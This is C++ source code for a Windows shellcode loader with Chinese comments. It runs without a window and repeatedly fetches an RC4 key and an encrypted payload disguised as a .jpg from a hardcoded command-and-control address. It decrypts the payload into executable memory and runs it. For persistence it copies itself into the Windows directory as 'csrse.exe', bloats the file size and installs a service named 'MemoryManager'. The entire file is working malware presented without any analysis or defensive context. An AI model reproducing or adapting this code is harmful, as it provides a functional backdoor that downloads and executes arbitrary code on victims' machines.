#include <windows.h>  
#include <stdio.h>  
#include <string>
#include "b64/base64.h"
//#include <string.h>

#include "EsyGet/HttpRequest.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"

//data段可读写  
#pragma comment(linker, "/section:.data,RWE")   
//不显示窗口  
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
#pragma comment(linker, "/INCREMENTAL:NO")
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);

const char target[] = "192.3.176.232";
const int  port = 81;
const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
typedef void(__stdcall *CODE) ();
char * shellcode = NULL;
int shellcode_size = 0; 

BOOL Move_(char* szPath, char *trPath, int bigger) {
	if (bigger == 0) {
		CopyFile(szPath, trPath, TRUE);
		return TRUE;
	}
	else {
		HANDLE pFile;
		DWORD fileSize;
		char *buffer;
		DWORD dwBytesRead, dwBytesToRead, tmpLen;
		pFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (pFile == INVALID_HANDLE_VALUE) {
			CloseHandle(pFile);
			return FALSE;
		}
		fileSize = GetFileSize(pFile, NULL);
		buffer = (char *)malloc(fileSize);
		ZeroMemory(buffer, fileSize);
		dwBytesToRead = fileSize;
		dwBytesRead = 0;
		ReadFile(pFile, buffer, dwBytesToRead, &dwBytesRead, NULL);
		CloseHandle(pFile);
		HANDLE pFile2;
		DWORD dwBytesWrite, dwBytesToWrite;
		pFile2 = CreateFile(trPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (pFile2 == INVALID_HANDLE_VALUE) {
			CloseHandle(pFile);
			return FALSE;
		}
		dwBytesToWrite = fileSize;
		dwBytesWrite = 0;
		WriteFile(pFile2, buffer, dwBytesToWrite, &dwBytesWrite, NULL);
		char *blank = (char *)malloc(1024);
		ZeroMemory(blank, 1024);
		for (int i = 0; i < bigger; i++) {
			WriteFile(pFile2, blank, 1024, &dwBytesWrite, NULL);
		}
		free(blank);
		CloseHandle(pFile2);
		free(buffer);
	}
}
std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5(u).toStr();
}
void GetShellCodeSize()
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/my/get_size");
	std::string body = httpReq.getBody(res);
	shellcode_size = std::atoi(body.c_str());
	
	shellcode = (char *)malloc(shellcode_size);
	
}
std::string GetKey()
{
	GetShellCodeSize();
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/"+ GenerateUri());

	std::string body = httpReq.getBody(res);
	return body;
}
void LoadShellCode(char *shellcode)
{
	PVOID p = NULL;
	p = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
	
	CODE code = (CODE)p;
	code();
	
}

void DecPayload(std::string key)
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);

	std::string res = httpReq.HttpGet("/"+ std::to_string(filename)+".jpg");
	std::string body = httpReq.getBody(res);
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);

	LoadShellCode(shellcode);
	
}

SECURITY_ATTRIBUTES pipeattr1, pipeattr2;
HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;
SECURITY_ATTRIBUTES saIn, saOut;

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
std::string ServiceName = "MemoryManager";
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
	if (!(ServiceStatusHandle = RegisterServiceCtrlHandler(ServiceName.c_str(),
		BDHandler))) return;
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
		| SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
	while (TRUE){
		DecPayload(GetKey());
		Sleep(50000);// 如果掉线，过一分钟自动重连
	}
	
}


void WINAPI BDHandler(DWORD dwControl)
{
	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	default:
		break;
	}
}

void ServiceInstall() {
	char  szPath[MAX_PATH];
	char  target[MAX_PATH];
	//char  tar_path[MAX_PATH];
	char  Direectory[MAX_PATH];
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (OpenEventA(2031619, FALSE, ServiceName.c_str()) != 0) {
		return;
	}
	// AdvanceProcess();
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = (LPSTR)ServiceName.c_str();
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	StartServiceCtrlDispatcher(ServiceTable);
	if (!GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH)) return;

	if (!GetModuleFileName(NULL, (LPSTR)szPath, MAX_PATH)) return;

	if (!GetCurrentDirectory(MAX_PATH, Direectory)) return;
	if (strcmp(Direectory, target) != 0) {
		//判断是否在windows目录下
		std::string starget = target;
		starget.append("\\csrse.exe");
		Move_(szPath,(char *)starget.c_str(),30000);
		std::string cmd = "sc create ";
		cmd = cmd + ServiceName;
		cmd.append(" binPath= ");
		cmd = cmd + starget;
		system(cmd.c_str());
		//sprintf(cmd,"attrib +s +a +h +r %s",target);
		//system(cmd);
		//sprintf(cmd,"sc start ", ServiceName.c_str());
		cmd = "sc start ";
		cmd = cmd + ServiceName;
		system(cmd.c_str());
		exit(0);
		return;
	}
}


int main()
{  
	

	//如果要不安装服务运行，请直接DecPayload(GetKey());
	ServiceInstall();
	//DecPayload(GetKey());
	
    return 0;  
}  